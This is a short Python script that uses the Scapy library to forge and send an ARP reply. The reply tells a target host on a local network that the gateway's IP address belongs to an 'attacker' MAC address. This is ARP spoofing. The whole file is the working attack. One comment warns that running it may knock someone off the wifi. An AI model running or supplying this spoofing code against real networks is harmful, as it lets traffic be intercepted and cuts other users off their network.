from scapy.all import ARP, send
# "Dangerous". you may get kicked off the wifi or kick someone else off

# Define the target IP and gateway IP addresses
target_ip = "10.0.0.5"
gateway_ip = "10.0.0.254"

# Define the attacker's MAC address
attacker_mac = "aa:bb:cc:dd:ee:ff"

# Create an ARP response packet to spoof the target
arp_response = ARP(
    op=2,
    pdst=target_ip,
    hwdst="ff:ff:ff:ff:ff:ff",
    psrc=gateway_ip,
    hwsrc=attacker_mac)

# Send the spoofed ARP response
send(arp_response, verbose=False)
